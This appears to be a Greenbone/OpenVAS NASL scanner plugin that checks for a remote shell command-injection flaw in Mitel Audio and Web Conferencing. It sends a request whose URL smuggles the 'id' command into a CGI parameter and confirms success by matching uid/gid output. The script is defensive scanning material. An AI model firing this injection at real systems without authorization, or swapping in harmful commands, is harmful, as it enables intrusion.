if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103010" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2011-01-04 15:14:45 +0100 (Tue, 04 Jan 2011)" );
	script_bugtraq_id( 45537 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "Mitel Audio and Web Conferencing (AWC) Remote Arbitrary Shell Command Injection Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/45537" );
	script_xref( name: "URL", value: "http://www.mitel.com/DocController?documentId=26451" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/515403" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "The reporter indicates that updates are available. Symantec has not
confirmed this. Please see the references for details." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Mitel Audio and Web Conferencing (AWC) is prone to a remote
command-injection vulnerability because it fails to adequately
sanitize user-supplied input data.

Remote attackers can exploit this issue to execute arbitrary shell
commands with the privileges of the user running the application." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
url = NASLString( "/awcuser/cgi-bin/vcs?xsl=/vcs/vcs_home.xsl%26id%26" );
if(http_vuln_check( port: port, url: url, pattern: "uid=[0-9]+.*gid=[0-9]+.*" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

